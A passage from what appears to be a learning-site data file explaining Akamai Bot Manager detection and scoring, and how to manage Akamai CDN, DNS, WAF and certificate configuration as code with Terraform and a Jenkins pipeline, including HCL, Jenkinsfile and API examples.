        { label: "5. JavaScript Challenge (Client-Side)", description: "For unknown or suspicious clients, Bot Manager injects a JavaScript challenge into the response. A real browser executes the JavaScript and sends back signals: Can it execute JS at all? (headless scrapers without JS engines fail here). Browser API fingerprints (navigator, screen, WebGL). Mouse movement patterns, keyboard timing, touch events. Cookie behavior (can it set and return cookies?). This is the most powerful detection layer.", badge: "Bot", badgeColor: "accent" },
        { label: "6. Behavioral ML Model", description: "All signals from steps 2-5 feed into a machine learning model that produces a bot score (0-100). The model considers: request rate patterns, session behavior (does the client browse like a human?), device consistency (do the claimed capabilities match the TLS fingerprint?), and historical behavior. Score thresholds are configurable: >80 = block, 50-80 = challenge, <50 = allow.", badge: "ML", badgeColor: "accent" },
        { label: "7. Action Applied", description: "Based on classification and score: ALLOW — request proceeds normally (good bots, verified humans). BLOCK — return 403 or custom error page. CHALLENGE — serve a CAPTCHA, crypto challenge, or managed challenge. TARPIT — allow but deliberately slow the response (wastes attacker resources). SERVE ALTERNATE — return fake/decoy content (e.g., fake prices to scrapers). The action is configurable per bot category and score range.", badgeColor: "muted" },
      ],
    },
    visualBlocks: [
      { icon: "✅", label: "Good Bots (Allow)", description: "Legitimate automation you want to keep", items: ["Googlebot, Bingbot (search indexing)", "Facebook, Slack (link previews)", "Pingdom, Datadog (monitoring)", "SEO tools (Ahrefs, SEMrush)"] },
      { icon: "🚫", label: "Bad Bots (Block)", description: "Malicious automation you want to stop", items: ["Web scrapers (content/price theft)", "Credential stuffers (stolen logins)", "Inventory hoarders (scalper bots)", "Vulnerability scanners"] },
      { icon: "❓", label: "Unknown Bots (Challenge)", description: "Unclassified — needs deeper analysis", items: ["JavaScript challenge (invisible)", "Crypto challenge (proof of work)", "CAPTCHA (visual)", "Managed (auto-selected)"] },
    ],
    concepts: [
      { title: "Bot Categories — Not All Bots Are Bad", content: "Known Good Bots: search engine crawlers (Googlebot, Bingbot, Yandex), social media crawlers (Facebook, Twitter/X, LinkedIn — for link previews), monitoring services (Pingdom, Datadog, UptimeRobot), SEO tools (Ahrefs, SEMrush), accessibility checkers. These should be ALLOWED — blocking Googlebot means your site disappears from search results. Known Bad Bots: web scrapers (stealing content, prices, inventory data), credential stuffers (testing stolen username/password combos), spam bots (filling forms with junk), vulnerability scanners (looking for exploitable bugs), inventory hoarders (buying limited items before humans). Unknown Bots: unclassified automated traffic. Could be a new monitoring tool, a developer's script, or a sophisticated bad bot. These need challenges or deeper analysis." },
      { title: "Challenge Types — Making Bots Prove They Are Human", content: "JavaScript Challenge: The simplest challenge — inject JavaScript that a real browser executes automatically. Blocks bots without JS engines (curl, wget, Python requests, simple scrapers). Invisible to real users. Crypto Challenge (Proof of Work): Requires the client to solve a computational puzzle (like Bitcoin mining, but simpler). Real browsers solve it in 1-2 seconds. Simple bots cannot solve it at all. Sophisticated bots CAN solve it, but it costs them CPU time — making large-scale attacks expensive. CAPTCHA: Visual challenge (click all traffic lights, type distorted text). Most intrusive for real users — use sparingly. Effective against most automated tools. Managed Challenge: Akamai auto-selects the appropriate challenge type based on the bot score. Low suspicion = JavaScript. Medium = crypto. High = CAPTCHA. This is the recommended setting." },
      { title: "Bot Score — Granular Classification", content: "Bot Manager assigns a continuous score from 0 to 100 for every request: 0-20 = definitely human (passed all challenges, normal behavior). 20-50 = probably human (some anomalies but likely legitimate). 50-80 = suspicious (multiple signals suggest automation). 80-100 = definitely bot (failed challenges, known bot patterns, impossible behavior). You configure thresholds: requests scoring above your block threshold are denied, those in the challenge range get a CAPTCHA, and those below are allowed. You can set different thresholds for different URL paths — tighter on /login, looser on /content." },
      { title: "Transactional Endpoint Protection", content: "Critical business endpoints need extra protection beyond general bot detection. Login pages: monitor for credential stuffing — attackers testing millions of stolen username/password combos. Bot Manager detects: high failure rates from an IP, password spraying patterns (same password, many usernames), and distributed attacks across many IPs. Checkout pages: monitor for inventory hoarding — bots adding limited-edition items to carts faster than humans. Detection: abnormal add-to-cart rates, scripted checkout flows. Account creation: monitor for fake account creation — bots creating accounts for spam, fraud, or resale. Detection: rapid sequential creation, disposable email patterns. Each endpoint can have custom response actions: serve fake success responses to waste attacker time, add delays to slow attacks, or trigger secondary verification." },
      { title: "Bot Analytics — Understanding Your Traffic", content: "Bot Manager provides detailed analytics: what percentage of your traffic is bots? Which are good vs. bad? Which pages do bots target most? Common findings that surprise customers: 40-60% of total traffic is typically bots (not humans). Good bots (search engines, monitoring) are usually 10-20%. Bad bots (scrapers, stuffers) are 20-40%. The remaining human traffic is your actual audience. Understanding this breakdown helps you: right-size your infrastructure (you might be paying for 2x the origin capacity you need), identify content being scraped, and detect credential stuffing before it results in account takeovers." },
    ],
    comparisons: [
      {
        title: "Bot Detection Signals — Layered Defense",
        description: "No single signal catches all bots. Effective bot detection combines multiple signals from different layers.",
        items: [
          { icon: "📋", label: "Passive Signals (No Client Interaction)", description: "Signals available immediately without any client-side challenge.", points: ["IP reputation — is this IP known for bot activity?", "User-Agent analysis — does it claim to be a known bot?", "TLS fingerprint (JA3) — does the TLS handshake match a real browser?", "HTTP/2 fingerprint — frame ordering, settings, priorities", "Request rate and pattern — too fast or too regular for a human?", "Cheapest to compute — used as the first filter"] },
          { icon: "🧪", label: "Active Signals (Client-Side Challenge)", description: "Signals gathered by injecting JavaScript into the response.", points: ["JavaScript execution — can the client run JS at all?", "Browser API fingerprint — navigator, screen, WebGL, canvas", "Mouse/keyboard/touch events — does the client interact like a human?", "Cookie behavior — can it set, store, and return cookies?", "Environment consistency — do claimed capabilities match reality?", "Most powerful but adds ~50ms latency for first request"] },
        ],
        tip: "Deploy Bot Manager in monitor mode first. Run it for 2 weeks to understand your bot traffic composition before enabling blocking actions.",
      },
    ],
    codeExamples: [
      { title: "Bot Manager Policy Configuration", language: "json", code: `{
  "botManagerPolicy": "www.example.com",
  "detectionSettings": {
    "knownBots": {
      "googlebot": {
        "action": "allow",
        "verify": "reverse_dns"
      },
      "bingbot": {
        "action": "allow",
        "verify": "reverse_dns"
      },
      "scraperbot-xyz": {
        "action": "deny"
      }
    },
    "unknownBots": {
      "defaultAction": "managed_challenge",
      "scoring": {
        "blockThreshold": 80,
        "challengeThreshold": 50
      }
    },
    "transactionalEndpoints": [
      {
        "path": "/api/login",
        "protection": "aggressive",
        "rateLimitPerIp": 5,
        "actions": {
          "credentialStuffing": "tarpit",
          "bruteForce": "deny_with_captcha"
        }
      },
      {
        "path": "/checkout",
        "protection": "standard",
        "actions": {
          "inventoryHoarding": "deny"
        }
      }
    ]
  }
}` },
    ],
    glossary: [
      { title: "Bot Manager Terms", color: "accent", terms: [
        { term: "Bot Score", definition: "0-100 score indicating likelihood of automated traffic (0 = human, 100 = bot)" },
        { term: "Bot Signature", definition: "Known pattern identifying a specific bot (User-Agent, IP range, behavior)" },
        { term: "JA3 Fingerprint", definition: "TLS handshake fingerprint — different for Chrome, Firefox, curl, Python, etc." },
        { term: "Crypto Challenge", definition: "Computational puzzle (proof of work) that costs bots CPU time" },
        { term: "Credential Stuffing", definition: "Automated testing of stolen username/password combinations against login pages" },
        { term: "Tarpit", definition: "Deliberately slowing responses to waste attacker resources without revealing detection" },
        { term: "Device Fingerprint", definition: "Unique identifier based on browser APIs, canvas, WebGL, and system properties" },
        { term: "Reverse DNS Verification", definition: "Confirming a bot's identity by checking if its IP resolves to the claimed domain" },
        { term: "Managed Challenge", definition: "Akamai auto-selects the appropriate challenge type based on bot score" },
        { term: "Inventory Hoarding", definition: "Bots rapidly adding limited items to carts before human customers can buy them" },
      ]},
    ],
    tips: [
      "Always verify 'Googlebot' claims with reverse DNS — attackers commonly spoof the User-Agent string",
      "Deploy in monitor mode first — understand your bot traffic composition (often 40-60% of total traffic) before blocking",
      "Use transactional endpoint protection for login and checkout — these are the highest-value targets for attackers",
      "Review bot analytics weekly — new bot patterns emerge constantly as attackers evolve",
      "Serve fake content to scrapers instead of blocking them — they waste time and you identify their patterns",
      "Remember: blocking good bots (Googlebot) hurts your SEO. Always allowlist verified search engine crawlers.",
    ],
    whenToUse: [
      "Your site experiences credential stuffing attacks on login/registration pages",
      "Web scraping is stealing your content, pricing, or inventory data",
      "Bot traffic is inflating analytics numbers and wasting server resources",
      "Inventory hoarding bots are buying limited products before real customers",
    ],
  },

  "akamai-terraform-jenkins": {
    id: "akamai-terraform-jenkins",
    hero: {
      badge1: { label: "IaC", color: "accent" },
      title: "Terraform & Jenkins",
      subtitle: "Infrastructure as Code & CI/CD for Akamai",
      description: "Manage Akamai configurations as code using Terraform's Akamai Provider and automate deployments with Jenkins CI/CD pipelines. This enables version-controlled, peer-reviewed, automated infrastructure changes — replacing manual clicks in Akamai Control Center.",
      highlights: [
        { icon: "📝", label: "Config as Code", detail: "Akamai properties, DNS, WAF rules in HCL files" },
        { icon: "🔄", label: "CI/CD Pipeline", detail: "Automated test → stage → production deployment" },
        { icon: "👥", label: "Peer Review", detail: "Git PRs for infrastructure changes, not ticket-based" },
        { icon: "🔙", label: "Rollback Safety", detail: "Git revert + terraform apply = instant rollback" },
      ],
      mentalModel: "Instead of clicking through Akamai Control Center to change a property rule (and hoping you did not break anything), you write Terraform HCL that describes the desired state. Terraform compares your code to the current Akamai configuration, generates a plan showing exactly what will change, and applies the changes via Akamai APIs. Jenkins orchestrates this into a safe pipeline: developer pushes code to Git → Jenkins runs terraform plan → team reviews the plan in a PR → Jenkins runs terraform apply to staging → smoke tests run → manual approval → Jenkins promotes to production. If something breaks, you git revert the commit and terraform apply to roll back — no guessing what the previous configuration was.",
    },
    architecture: {
      sectionLabel: "CI/CD Pipeline",
      title: "From Code Commit to Production — The Complete Pipeline",
      description: "Here is exactly what happens from the moment a developer pushes a Terraform change to when it is live on the Akamai production network. Each step has a specific purpose in catching problems before they reach users.",
      pipeline: [
        { label: "1. Developer Writes HCL", description: "A developer modifies Terraform HCL files — changing a caching rule, adding a WAF exception, updating DNS records, or configuring a new property. They test locally with terraform validate (syntax check) and terraform plan (preview changes). They commit to a feature branch.", badgeColor: "muted" },
        { label: "2. Git Push + Pull Request", description: "Developer pushes the branch and opens a Pull Request. This is the key governance moment: infrastructure changes are now peer-reviewed like application code. The PR shows the Terraform code diff, and the CI pipeline will add the terraform plan output as a PR comment — so reviewers see exactly what will change on Akamai.", badgeColor: "muted" },
        { label: "3. Jenkins: terraform init", description: "Jenkins pipeline triggers on the PR. First step: terraform init downloads the Akamai Terraform provider plugin and configures the remote state backend (S3, Terraform Cloud). The Akamai provider authenticates using edgerc credentials stored in Jenkins as a secret.", badge: "CI/CD", badgeColor: "accent" },
        { label: "4. Jenkins: terraform validate + plan", description: "terraform validate checks HCL syntax. terraform plan connects to Akamai APIs, reads the current configuration, compares it to the desired state in your code, and generates a detailed change plan: 'Will modify caching TTL from 1h to 30min on path /api/*'. This plan is posted as a comment on the PR for reviewers to inspect.", badge: "CI/CD", badgeColor: "accent" },
        { label: "5. Peer Review + Approval", description: "Team members review the PR: the code changes (HCL diff) AND the terraform plan output. They verify: Does the plan match the intent? Are there unexpected changes (drift)? Is the change safe for production traffic? After approval, the PR is merged to main.", badgeColor: "muted" },
        { label: "6. Jenkins: terraform apply (Staging)", description: "On merge to main, Jenkins runs terraform apply targeting the Akamai STAGING network. This creates a new property version and activates it on staging. Staging is Akamai's test network — it mirrors production behavior but only serves traffic from test hostnames or specific IPs.", badge: "IaC", badgeColor: "accent" },
        { label: "7. Smoke Tests on Staging", description: "Automated tests run against the staging environment: Does the site load? Are caching headers correct? Does the WAF still block test attack payloads? Are DNS records resolving correctly? Is TLS configured properly (SSL Labs API check)? If any test fails → pipeline stops, team is notified.", badge: "Test", badgeColor: "accent" },
        { label: "8. Promote to Production", description: "After staging tests pass, a manual approval gate (or automatic after a waiting period). Jenkins runs terraform apply with network=PRODUCTION, activating the new property version on the production network. Akamai propagates the change to 4,000+ edge servers globally in minutes. The new configuration is live.", badge: "Akamai", badgeColor: "accent" },
      ],
    },
    visualBlocks: [
      { icon: "🌐", label: "Digital Properties (CDN)", description: "The #1 use case — manage CDN delivery configs as code", items: ["Caching rules, TTLs, cache keys", "Origin settings and failover", "Performance behaviors (SureRoute, prefetch)", "Edge hostname and CP Code assignment", "akamai_property + akamai_property_activation"] },
      { icon: "📡", label: "DNS Zones & Records", description: "Manage Edge DNS records — no more clicking in Control Center", items: ["A, AAAA, CNAME, MX, TXT, SRV records", "Zone creation and delegation", "TTL management per record", "akamai_dns_zone + akamai_dns_record"] },
      { icon: "🛡️", label: "WAF / Security Policies", description: "Configure App & API Protector rules as code", items: ["Attack group actions (deny/alert) + sensitivity", "Custom WAF rules and exceptions", "Rate control policies", "akamai_appsec_* resources"] },
      { icon: "📜", label: "TLS Certificates (CPS)", description: "Provision and manage HTTPS certs automatically", items: ["DV/OV/EV certificate enrollment", "SAN management (multi-domain certs)", "Auto-renewal configuration", "akamai_cps_dv_enrollment"] },
      { icon: "🤖", label: "Bot Manager", description: "Configure bot detection policies in HCL", items: ["Bot category actions (allow/deny/challenge)", "Transactional endpoint protection", "Score thresholds and response actions", "akamai_botman_* resources"] },
      { icon: "⚡", label: "EdgeWorkers", description: "Deploy serverless edge functions via CI/CD", items: ["EdgeWorker ID and version management", "Code bundle deployment", "Activation on staging/production", "akamai_edgeworkers_* resources"] },
    ],
    concepts: [
      { title: "Terraform 101 — What Is It? (Start Here)", content: "Terraform is an open-source tool by HashiCorp that lets you manage infrastructure using code instead of clicking through web UIs. You write files describing WHAT you want (a DNS record, a CDN rule, a WAF policy), and Terraform figures out HOW to make it happen by calling the platform's APIs. Think of it like a recipe: you write the ingredients and steps, Terraform cooks the meal. The key idea is 'declarative' — you describe the desired end state, not the steps to get there. If the infrastructure already matches your code, Terraform does nothing. If something is different, it changes only what is needed. Terraform works with 3,000+ platforms (AWS, GCP, Azure, Akamai, Cloudflare, GitHub, etc.) through 'providers' — plugins that know how to talk to each platform's API." },
      { title: "HCL — The Language Terraform Uses", content: "HCL stands for HashiCorp Configuration Language. It is a simple, human-readable language designed specifically for defining infrastructure. It is NOT a programming language — you do not write loops or complex logic (though it has some). Think of it as structured config files with superpowers.\n\nBasic HCL looks like this:\nresource \"akamai_dns_record\" \"www\" {\n  zone       = \"example.com\"\n  name       = \"www.example.com\"\n  recordtype = \"CNAME\"\n  ttl        = 300\n  target     = [\"www.example.com.edgekey.net.\"]\n}\n\nWhat this says: 'I want a DNS CNAME record called www.example.com pointing to Akamai's edge, with a 5-minute TTL.' That is it. Terraform reads this, checks if the record exists, and creates or updates it via the Akamai API.\n\nKey HCL concepts: resource = something Terraform manages (a DNS record, a property, a WAF rule). data = read-only lookup (get info without creating anything). variable = input parameter (contract_id, environment name). output = value to display after apply (like the property ID that was created).", codeSnippet: { language: "hcl", code: "# HCL is just structured key-value config\nresource \"type\" \"name\" {\n  setting1 = \"value\"\n  setting2 = 300\n  list     = [\"a\", \"b\"]\n\n  nested_block {\n    key = \"value\"\n  }\n}" } },
      { title: "The Terraform Workflow — 3 Commands You Need", content: "Every Terraform workflow follows the same 3 steps:\n\n1. terraform init — Downloads the provider plugin (e.g., Akamai provider) and sets up the backend. Run once per project, or when you change providers.\n\n2. terraform plan — The 'dry run'. Terraform reads your HCL files, connects to Akamai's API to see what currently exists, and shows you a diff: '+ will create this record', '~ will modify this setting', '- will destroy this resource'. NEVER skip this step — always review the plan.\n\n3. terraform apply — Executes the plan. Terraform makes the actual API calls to Akamai to create/update/delete resources. You can (and should) require manual confirmation before it runs.\n\nBonus: terraform destroy removes everything Terraform manages. Use with extreme caution.\n\nThe beauty: if you run plan/apply and nothing has changed, Terraform says 'No changes. Your infrastructure matches the configuration.' — confirming everything is in sync." },
      { title: "Terraform State — How It Tracks What It Manages", content: "When Terraform creates a resource (like an Akamai property), it records the details in a 'state file' (terraform.tfstate). This is a JSON file that maps your HCL code to real Akamai resources. Example: 'The resource akamai_property.www in my code corresponds to Akamai property ID prp_123456.'\n\nWhy state matters: Without it, Terraform would not know if a resource already exists. It would try to create duplicates every time you run apply.\n\nCritical rules: (1) For teams, use a REMOTE backend (S3, Terraform Cloud) so everyone shares the same state. (2) Enable state LOCKING (DynamoDB for S3 backend) so two people cannot apply at the same time. (3) Never manually edit the state file — use terraform state commands. (4) For existing Akamai configs, use terraform import to bring them under management." },
      { title: "Akamai Terraform Provider — What It Manages", content: "The Akamai Terraform Provider is the plugin that connects Terraform to Akamai's OPEN APIs. You configure it with an .edgerc file (API credentials from Akamai Control Center).\n\nWhat you can manage as code:\n• Digital Properties (akamai_property) — CDN rules, caching, origins, performance behaviors. This is the #1 use case.\n• DNS Zones & Records (akamai_dns_zone, akamai_dns_record) — Edge DNS A, AAAA, CNAME, MX, TXT records.\n• WAF / Security Policies (akamai_appsec_*) — Attack group actions, custom rules, rate limiting.\n• TLS Certificates (akamai_cps_dv_enrollment) — DV/OV/EV cert provisioning and auto-renewal.\n• Bot Manager (akamai_botman_*) — Bot category actions, transactional endpoints.\n• EdgeWorkers (akamai_edgeworkers_*) — Deploy serverless edge functions.\n• CP Codes & Edge Hostnames — Billing identifiers and CDN CNAMEs.\n\nAll resources support full CRUD (Create, Read, Update, Delete). Changes go through plan → apply → activate on staging or production.", codeSnippet: { language: "hcl", code: "# Minimal Akamai Terraform setup\nterraform {\n  required_providers {\n    akamai = {\n      source  = \"akamai/akamai\"\n      version = \"~> 6.0\"\n    }\n  }\n}\n\nprovider \"akamai\" {\n  edgerc         = \"~/.edgerc\"\n  config_section = \"default\"\n}" } },
      { title: "Property as Code — How CDN Rules Become HCL", content: "An Akamai property (CDN configuration) defines how traffic is handled for a set of hostnames. In Terraform, this becomes HCL code: the akamai_property resource specifies hostnames, origin settings, and a rule tree. The rule tree is the heart — it is a JSON structure defining caching behaviors, performance optimizations, security settings, and routing rules. Terraform's akamai_property_rules_builder data source lets you construct this tree in HCL instead of raw JSON. Each terraform apply creates a new property VERSION (Akamai keeps a history). You then activate that version on staging or production." },
      { title: "Handling Drift — When Reality Diverges from Code", content: "Drift happens when someone changes the Akamai configuration outside of Terraform (e.g., directly in Akamai Control Center). terraform plan detects drift — it shows unexpected differences between your code and the actual configuration. Options: (1) If the manual change was intentional, update your Terraform code to match. (2) If accidental, run terraform apply to revert to the code-defined state. Prevention: restrict Akamai Control Center write access to break-glass scenarios only. Use Terraform for all routine changes. Run terraform plan on a schedule (daily cron) to detect drift early." },
      { title: "Jenkins Pipeline Best Practices", content: "A production-grade Jenkins pipeline for Akamai: (1) Use Jenkinsfile in the repo (pipeline as code, not configured in Jenkins UI). (2) Store Akamai edgerc credentials as Jenkins secrets, never in code. (3) Run terraform plan on every PR — post the plan as a PR comment. (4) Require manual approval between staging and production. (5) Run smoke tests after staging deployment before promoting. (6) Keep staging and production in separate Terraform workspaces or state files. (7) Set up Slack/Teams notifications for pipeline results. (8) Archive terraform plan output as build artifacts for auditing." },
    ],
    comparisons: [
      {
        title: "Manual (Control Center) vs. Infrastructure as Code",
        description: "Why teams move from clicking in Akamai Control Center to managing configurations in Terraform.",
        items: [
          { icon: "🖱️", label: "Manual (Control Center)", description: "Traditional approach: make changes through the web UI.", points: ["Fast for one-off changes — click, configure, activate", "No version history — 'what changed last Tuesday?' is a mystery", "No peer review — one person can break production", "Rollback = remember what the previous settings were (good luck)", "No consistency — staging and production drift apart", "Audit trail limited to activation history (not what changed)"] },
          { icon: "📝", label: "Terraform + Jenkins", description: "Everything as code: Git-managed, peer-reviewed, automated.", points: ["Every change is a Git commit with full diff, author, and timestamp", "Peer review via Pull Requests — team validates before deployment", "terraform plan shows exactly what will change before applying", "Rollback = git revert + terraform apply (deterministic, fast)", "Staging and production are identical (same code, different variables)", "Full audit trail: who changed what, when, why (commit messages)"] },
        ],
        tip: "Start by importing your existing Akamai configurations into Terraform using terraform import or the Akamai CLI's export feature. Then lock down Control Center write access.",
      },
    ],
    codeExamples: [
      { title: "Terraform — Complete Akamai Property", language: "hcl", code: `# Provider configuration
terraform {
  required_providers {
    akamai = {
      source  = "akamai/akamai"
      version = "~> 5.0"
    }
  }

  # Remote state backend (team collaboration + locking)
  backend "s3" {
    bucket         = "mycompany-terraform-state"
    key            = "akamai/www.tfstate"
    region         = "us-east-1"
    dynamodb_table = "terraform-locks"  # State locking
    encrypt        = true
  }
}

provider "akamai" {
  edgerc         = "~/.edgerc"      # API credentials
  config_section = "default"
}

# Property resource — CDN configuration
resource "akamai_property" "www" {
  name        = "www.example.com"
  product_id  = "prd_Fresca"        # Ion product
  contract_id = var.contract_id
  group_id    = var.group_id

  hostnames {
    cname_from             = "www.example.com"
    cname_to               = "www.example.com.edgekey.net"
    cert_provisioning_type = "DEFAULT"  # Managed DV cert
  }

  rule_format = "v2024-01-09"
  rules       = data.akamai_property_rules_builder.rules.json
}

# Activate on staging or production (controlled by variable)
resource "akamai_property_activation" "activate" {
  property_id                    = akamai_property.www.id
  version                        = akamai_property.www.latest_version
  network                        = var.network  # "STAGING" or "PRODUCTION"
  contact                        = ["platform-team@example.com"]
  auto_acknowledge_rule_warnings = true
}

# Variables
variable "network" {
  description = "Akamai network to activate on"
  default     = "STAGING"
  validation {
    condition     = contains(["STAGING", "PRODUCTION"], var.network)
    error_message = "Must be STAGING or PRODUCTION."
  }
}` },
      { title: "Jenkinsfile — Complete Akamai CI/CD Pipeline", language: "groovy", code: `pipeline {
  agent any

  environment {
    EDGERC = credentials('akamai-edgerc')  // Jenkins secret
  }

  stages {
    stage('Init') {
      steps {
        sh 'terraform init -backend-config="key=akamai/www.tfstate"'
      }
    }

    stage('Validate') {
      steps {
        sh 'terraform validate'
        sh 'terraform fmt -check'  // Enforce formatting
      }
    }

    stage('Plan') {
      steps {
        sh 'terraform plan -out=tfplan -var="network=STAGING"'
        archiveArtifacts artifacts: 'tfplan'

        // Post plan output to PR (if triggered by PR)
        script {
          def planOutput = sh(returnStdout: true,
            script: 'terraform show -no-color tfplan')
          // Post as GitHub PR comment via API
        }
      }
    }

    stage('Deploy to Staging') {
      when { branch 'main' }
      steps {
        sh 'terraform apply -auto-approve tfplan'
      }
    }

    stage('Smoke Tests') {
      when { branch 'main' }
      steps {
        sh './scripts/smoke-test.sh staging'
        // Tests: site loads, caching headers correct,
        // WAF blocks test payloads, TLS A+ rating
      }
    }

    stage('Promote to Production') {
      when { branch 'main' }
      steps {
        input message: 'Staging verified. Promote to production?'
        sh 'terraform apply -auto-approve -var="network=PRODUCTION"'
      }
    }
  }

  post {
    failure {
      slackSend channel: '#platform-alerts',
        message: "Akamai deploy FAILED: \${env.BUILD_URL}"
    }
    success {
      slackSend channel: '#platform-deploys',
        message: "Akamai deploy SUCCESS: \${env.BUILD_URL}"
    }
  }
}` },
      { title: "Terraform — DNS Zone Management", language: "hcl", code: `# Manage Edge DNS records as code
# Changes are version-controlled and peer-reviewed

resource "akamai_dns_zone" "example" {
  zone     = "example.com"
  type     = "PRIMARY"
  contract = var.contract_id
  group    = var.group_id
}

resource "akamai_dns_record" "www" {
  zone       = akamai_dns_zone.example.zone
  name       = "www.example.com"
  recordtype = "CNAME"
  ttl        = 300
  target     = ["www.example.com.edgekey.net."]
}

resource "akamai_dns_record" "api" {
  zone       = akamai_dns_zone.example.zone
  name       = "api.example.com"
  recordtype = "A"
  ttl        = 60  # Short TTL for failover
  target     = ["203.0.113.50", "203.0.113.51"]
}

resource "akamai_dns_record" "mx" {
  zone       = akamai_dns_zone.example.zone
  name       = "example.com"
  recordtype = "MX"
  ttl        = 3600
  target     = ["10 mail1.example.com.", "20 mail2.example.com."]
}

# terraform plan shows:
# + akamai_dns_record.www will be created
#   + name       = "www.example.com"
#   + recordtype = "CNAME"
#   + target     = ["www.example.com.edgekey.net."]` },
      { title: "Terraform — WAF Security Policy Update", language: "hcl", code: `# Update WAF attack group settings via Terraform
# No clicking through Control Center — just code

resource "akamai_appsec_attack_group" "sql_injection" {
  config_id          = akamai_appsec_configuration.main.config_id
  security_policy_id = akamai_appsec_security_policy.www.security_policy_id
  attack_group       = "SQL"
  attack_group_action = "deny"  # Block SQL injection attempts

  condition_exception = jsonencode({
    # Exception: allow SQL-like syntax in the search box
    exception = {
      specificHeaderCookieOrParamNameValue = [{
        names    = ["q", "search_query"]
        selector = "REQUEST_PARAMETERS"
      }]
    }
  })
}

resource "akamai_appsec_attack_group" "xss" {
  config_id          = akamai_appsec_configuration.main.config_id
  security_policy_id = akamai_appsec_security_policy.www.security_policy_id
  attack_group       = "XSS"
  attack_group_action = "deny"
}

resource "akamai_appsec_rate_policy" "login" {
  config_id   = akamai_appsec_configuration.main.config_id
  rate_policy = jsonencode({
    name                  = "Login Brute Force Protection"
    description           = "Block IPs exceeding 10 requests/min to /login"
    averageThreshold      = 10
    burstThreshold        = 15
    clientIdentifier      = "ip"
    matchType             = "path"
    path                  = { positiveMatch = true, values = ["/api/login", "/login"] }
    requestType           = "ForwardResponse"
    sameActionOnIpv6      = true
    useXForwardForHeaders = false
  })
}` },
      { title: "Akamai OPEN API — Purge Cache via curl", language: "bash", code: `# Akamai configurations can be managed via REST API
# The Akamai OPEN APIs use EdgeGrid authentication

# Example 1: Purge CDN cache for specific URLs
# (When you deploy new content and need it live immediately)
$ curl -X POST "https://akaa-xxx.purge.akamaiapis.net/ccu/v3/invalidate/url/production" \\
  --header "Content-Type: application/json" \\
  --data '{
    "objects": [
      "https://www.example.com/index.html",
      "https://www.example.com/css/main.css",
      "https://www.example.com/api/products"
    ]
  }'
# Response: { "purgeId": "abc-123", "estimatedSeconds": 5 }

# Example 2: Purge by CP Code (everything under a billing code)
$ curl -X POST "https://akaa-xxx.purge.akamaiapis.net/ccu/v3/invalidate/cpcode/production" \\
  --data '{ "objects": [12345] }'

# Example 3: List all properties via API
$ curl "https://akaa-xxx.luna.akamaiapis.net/papi/v1/properties?contractId=ctr_123&groupId=grp_456"

# Example 4: Get current WAF security config
$ curl "https://akaa-xxx.luna.akamaiapis.net/appsec/v1/configs/12345/versions/1/security-policies"

# All API calls require EdgeGrid auth (not shown for brevity)
# Use the Akamai CLI or SDKs (Python, Node.js, Go, Java) 
# which handle EdgeGrid signing automatically:
$ akamai purge invalidate --urls https://www.example.com/index.html
$ akamai property retrieve --property www.example.com` },
      { title: "Terraform — Certificate Enrollment (CPS)", language: "hcl", code: `# Manage TLS certificates as code
# Akamai CPS handles issuance, validation, and auto-renewal

resource "akamai_cps_dv_enrollment" "www" {
  common_name = "www.example.com"
  sans        = ["shop.example.com", "api.example.com"]

  admin_contact {
    first_name = "Platform"
    last_name  = "Team"
    email      = "platform@example.com"
    phone      = "+1-555-0100"
    organization = "Example Corp"
  }

  tech_contact {
    first_name = "Platform"
    last_name  = "Team"
    email      = "platform@example.com"
    phone      = "+1-555-0100"
    organization = "Example Corp"
  }

  certificate_chain_type = "default"
  csr {
    organization = "Example Corp"
    country_code = "US"
    state        = "California"
    city         = "San Francisco"
  }

  network_configuration {
    geography = "core"      # Standard network
    sni_only  = true        # SNI (no dedicated IP needed)
  }

  signature_algorithm = "SHA-256"
  secure_network      = "ENHANCED_TLS"
  acknowledge_pre_verification_warnings = true
}

# After apply: Akamai issues a DV challenge (DNS TXT record)
# Validates domain ownership, issues cert, and auto-renews` },
      { title: "Initial Setup — Bootstrap Existing Policy into Terraform", language: "bash", code: `# Step 1: Create a new directory for your Terraform project
mkdir terraform-cloudlets && cd terraform-cloudlets

# Step 2: Export your existing Akamai policy as Terraform files
# This auto-generates .tf files from your live Akamai config
akamai terraform create cloudlets \\
  --policy-name="Your-Existing-ER-Policy" \\
  --group-id="grp_123456789" \\
  --edgerc=~/.edgerc \\
  --section=default

# Generated files:
#   ├── main.tf            ← Provider config + resource definitions
#   ├── variables.tf       ← Input variables (contract_id, group_id, etc.)
#   ├── import.sh           ← Script to import existing resources into state
#   └── terraform.tfvars   ← Variable values

# Step 3: Initialize Terraform + Import existing resources
terraform init          # Downloads Akamai provider plugin
sh import.sh            # Links existing Akamai resources to Terraform state
terraform plan          # ← Should show "No changes" ✓
                        #    (proves Terraform matches live config)

# Step 4: Commit to Git (infrastructure is now version-controlled)
git add .
git commit -m "Initial: Bootstrap existing ER policy under Terraform mgmt"
git push origin main

# Step 5 (optional): Create a GitHub PR for team review
# ← Jenkins PR job runs:
#    terraform init
#    terraform validate
#    terraform plan    ← Confirms "No changes" → Posts to PR` },
      { title: "Everyday Workflow — Making Changes via Terraform + CI/CD", language: "bash", code: `# === EVERYDAY WORKFLOW ===
# Developer wants to change an Akamai configuration (e.g., update a 
# cloudlet policy rule, change a caching TTL, add a WAF exception)

# 1. Create a feature branch
git checkout -b feat/update-er-rules

# 2. Edit the .tf files (your change is just a code diff)
#    Example: update a match rule in cloudlets.tf
#    - match_value = "/old-promo"
#    + match_value = "/summer-sale"

# 3. Preview what will change (local dry run)
terraform plan
# Output:
#   ~ akamai_cloudlets_policy.er_policy
#       ~ match_rules: "/old-promo" → "/summer-sale"
#   Plan: 0 to add, 1 to change, 0 to destroy.

# 4. Commit + Push + Open PR
git add . && git commit -m "Update ER rule: redirect /summer-sale"
git push origin feat/update-er-rules
# → Open Pull Request on GitHub

# 5. Jenkins PR Job runs automatically:
#    ┌─────────────────────────────────────┐
#    │  terraform init                     │
#    │  terraform validate   ← syntax OK?  │
#    │  terraform plan       ← safe diff?  │
#    │  → Posts plan output as PR comment   │
#    └─────────────────────────────────────┘

# 6. Team reviews the PR:
#    - Code diff (what HCL changed)
#    - Plan output (what Akamai will actually do)
#    - Approve ✓ → Merge to main

# 7. Jenkins Deploy Pipeline (triggered on merge to main):
#    ┌──────────────────────────────────────────────┐
#    │  terraform apply (STAGING network)           │
#    │  → Smoke tests on staging                    │
#    │  → Manual approval gate                      │
#    │  terraform apply (PRODUCTION network)        │
#    │  → Slack notification: "Deploy complete ✅"   │
#    └──────────────────────────────────────────────┘

